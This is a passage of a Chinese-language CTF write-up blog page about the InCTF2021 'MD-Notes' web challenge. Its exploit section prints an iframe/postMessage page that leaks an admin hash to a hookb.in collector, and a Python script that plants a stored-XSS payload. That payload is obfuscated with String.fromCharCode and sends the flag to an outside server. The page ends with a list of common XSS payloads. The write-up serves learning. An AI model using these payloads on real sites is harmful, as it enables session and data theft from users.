+			<span class="nx">res</span><span class="p">.</span><span class="nx">Data</span> <span class="p">=</span> <span class="nx">template</span><span class="p">.</span><span class="nf">HTML</span><span class="p">(</span><span class="nx">CONFIG</span><span class="p">.</span><span class="nx">admin_token</span><span class="p">)</span> <span class="c1">// 直接将FLAG渲染进HTML 我们只要获取document.body即可
+</span><span class="c1"></span>		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+			<span class="nx">res</span><span class="p">.</span><span class="nx">Data</span> <span class="p">=</span> <span class="nx">template</span><span class="p">.</span><span class="nf">HTML</span><span class="p">(</span><span class="s">&#34;You are not admin.&#34;</span><span class="p">)</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="nx">previewTmpl</span><span class="p">.</span><span class="nf">Execute</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="exploit">Exploit</h4>
+<p>​	获取adminHash,</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="kd">function</span> <span class="nx">exploit</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;iframe&#34;</span><span class="p">).</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="s2">&#34;Hello&#34;</span><span class="p">,</span><span class="s2">&#34;*&#34;</span><span class="p">)</span>
+    <span class="p">}</span>
+
+    <span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&#34;message&#34;</span><span class="p">,(</span><span class="nx">event</span><span class="p">)=&gt;{</span>
+        <span class="kd">var</span> <span class="nx">img</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">();</span>
+        <span class="nx">img</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">&#34;https://hookb.in/NOP1yLbpQwSe8mNN8mR2?hash=&#34;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">Hash</span><span class="p">);</span>
+    <span class="p">},</span><span class="kc">false</span><span class="p">);</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://localhost:8080/demo&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;iframe&#34;</span> <span class="na">onload</span><span class="o">=</span><span class="s">&#34;exploit()&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>​	通知AdminBot访问我们构造的恶意页面，获取其Hash</p>
+<p>​	使用AdminHash提交我们的恶意脚本，提交代码如下，</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">&#39;Cookie&#39;</span><span class="p">:</span> <span class="s1">&#39;Token=2333&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36&#39;</span>
+<span class="p">}</span>
+<span class="n">Hash</span> <span class="o">=</span> <span class="s1">&#39;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855&#39;</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&lt;script&gt;fetch(String.fromCharCode(47, 97, 112, 105, 47, 102, 108, 97, 103)).then(function(response) {return response.text();}).then(function (text) {var img = new Image();img.src = String.fromCharCode(104,116,116,112,115,58,47,47,104,111,111,107,98,46,105,110,47,75,51,120,88,101,76,74,79,111,109,72,80,77,75,56,56,77,75,86,55,63,102,108,97,103,61) + encodeURIComponent(text);})&lt;/script&gt;&#39;</span>
+<span class="n">paramPost</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">&#39;Hash&#39;</span><span class="p">:</span> <span class="n">Hash</span><span class="p">,</span>
+    <span class="s1">&#39;Raw&#39;</span><span class="p">:</span> <span class="n">payload</span>
+<span class="p">}</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://localhost:8080/api/create&#39;</span><span class="p">,</span>
+                    <span class="n">json</span><span class="o">=</span><span class="n">paramPost</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>​	恶意脚本如下（获取FLAG）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="nx">fetch</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">47</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">112</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">103</span><span class="p">))</span>
+    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">img</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">();</span>
+        <span class="nx">img</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">104</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">112</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> 
+        <span class="mi">111</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">46</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">120</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">74</span><span class="p">,</span> <span class="mi">79</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> 
+        <span class="mi">72</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">77</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">77</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">61</span><span class="p">)</span> <span class="c1">// 攻击者控制的Web服务器
+</span><span class="c1"></span>        <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">());</span>
+    <span class="p">})</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>​	当Admin访问我们的页面时（<code>/REDACTED/0</code>），我们的恶意Script将会被执行，形成 Stored XSS。</p>
+<figure><a class="lightgallery" href="https://image.p1nant0m.com/image-20210927190809809.png" title="https://image.p1nant0m.com/image-20210927190809809.png" data-thumbnail="https://image.p1nant0m.com/image-20210927190809809.png" data-sub-html="<h2>访问恶意页面触发脚本执行</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://image.p1nant0m.com/image-20210927190809809.png"
+            data-srcset="https://image.p1nant0m.com/image-20210927190809809.png, https://image.p1nant0m.com/image-20210927190809809.png 1.5x, https://image.p1nant0m.com/image-20210927190809809.png 2x"
+            data-sizes="auto"
+            alt="https://image.p1nant0m.com/image-20210927190809809.png" />
+    </a><figcaption class="image-caption">访问恶意页面触发脚本执行</figcaption>
+    </figure>
+<p>​	我们注入的恶意脚本就从数据库中导出并且构成HTML文档的一部分，被浏览器解释执行，</p>
+<figure><a class="lightgallery" href="https://image.p1nant0m.com/image-20210927191107611.png" title="https://image.p1nant0m.com/image-20210927191107611.png" data-thumbnail="https://image.p1nant0m.com/image-20210927191107611.png" data-sub-html="<h2>恶意代码拼接进入 HTML 文档</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://image.p1nant0m.com/image-20210927191107611.png"
+            data-srcset="https://image.p1nant0m.com/image-20210927191107611.png, https://image.p1nant0m.com/image-20210927191107611.png 1.5x, https://image.p1nant0m.com/image-20210927191107611.png 2x"
+            data-sizes="auto"
+            alt="https://image.p1nant0m.com/image-20210927191107611.png" />
+    </a><figcaption class="image-caption">恶意代码拼接进入 HTML 文档</figcaption>
+    </figure>
+<p>​	最终我们可以在受我们控制的服务器中获得我们的FLAG，</p>
+<figure><a class="lightgallery" href="https://image.p1nant0m.com/image-20210927191308837.png" title="https://image.p1nant0m.com/image-20210927191308837.png" data-thumbnail="https://image.p1nant0m.com/image-20210927191308837.png" data-sub-html="<h2>flag 获取</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://image.p1nant0m.com/image-20210927191308837.png"
+            data-srcset="https://image.p1nant0m.com/image-20210927191308837.png, https://image.p1nant0m.com/image-20210927191308837.png 1.5x, https://image.p1nant0m.com/image-20210927191308837.png 2x"
+            data-sizes="auto"
+            alt="https://image.p1nant0m.com/image-20210927191308837.png" />
+    </a><figcaption class="image-caption">flag 获取</figcaption>
+    </figure>
+<h4 id="总结">总结</h4>
+<p>​	一些常用的Payload</p>
+<p><code>html</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;YOUR SERVER&#34;</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;exploit()&#34;</span><span class="p">&gt;</span> <span class="c">&lt;!-- 可以用于提交数据或者执行脚本--&gt;</span>
+<span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;URL&#34;</span> <span class="na">onload</span><span class="o">=</span><span class="s">&#34;exploit()&#34;</span><span class="p">&gt;</span> <span class="c">&lt;!-- 加载iframe时并且允许脚本 --&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><code>JavaScript</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">img</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">();</span>
+<span class="nx">img</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span> <span class="c1">// 创建img标签
+</span><span class="c1"></span>
+<span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;http://&#39;</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)=&gt;{</span>
+                      <span class="c1">// do something
+</span><span class="c1"></span>                      <span class="p">})</span>
+<span class="nx">target</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&#34;type (message)&#34;</span><span class="p">,</span> <span class="p">(</span><span class="nx">event</span><span class="p">)=&gt;{</span>
+                        <span class="c1">// do something
+</span><span class="c1"></span>                        <span class="p">},</span><span class="kc">false</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">getElementByID</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="c1">// 返回一个匹配特定ID的元素
+</span><span class="c1"></span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">()</span> <span class="c1">// 绕过过滤器
+</span><span class="c1"></span>
+<span class="c1">// 对字符串内容进行转义防止在构造URL时产生分歧 e.g. 某个Key的Value为 &amp;time=0001 若不进行转义该Value将会被看作为一个新的K-V对
+</span><span class="c1"></span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span> 
+
+<span class="nx">otherWindow</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="nx">message</span><span class="p">,</span> <span class="nx">targetOrigin</span><span class="p">,</span> <span class="p">[</span><span class="nx">transfer</span><span class="p">]);</span> <span class="c1">// 一种Data传递的方式，必须严格限定targetOrigin的值
+</span></code></pre></td></tr></table>
+</div>
+</div><p>​	一些概念：Stored XSS，CORS，Go，targetOrigin，同源策略，UUID，</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2021-10-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2021-10-20-md-notes/index.md" target="_blank">阅读原始文档</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://p1nant0m.com/2021-10-20-md-notes/" data-title="MD-Notes" data-via="p1nant0m" data-hashtags="Web,InCTF2021"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://p1nant0m.com/2021-10-20-md-notes/" data-hashtag="Web"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://p1nant0m.com/2021-10-20-md-notes/" data-title="MD-Notes"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://p1nant0m.com/2021-10-20-md-notes/" data-title="MD-Notes"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://p1nant0m.com/2021-10-20-md-notes/" data-title="MD-Notes"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/web/">Web</a>,&nbsp;<a href="/tags/inctf2021/">InCTF2021</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+            <a href="/2021-11-04-shenzhen-office/" class="next" rel="next" title="Shenzhen-Office">Shenzhen-Office<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.91.2">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">p1nant0m</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"id-1":"😷P1nant0m","id-2":"😷P1nant0m"},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
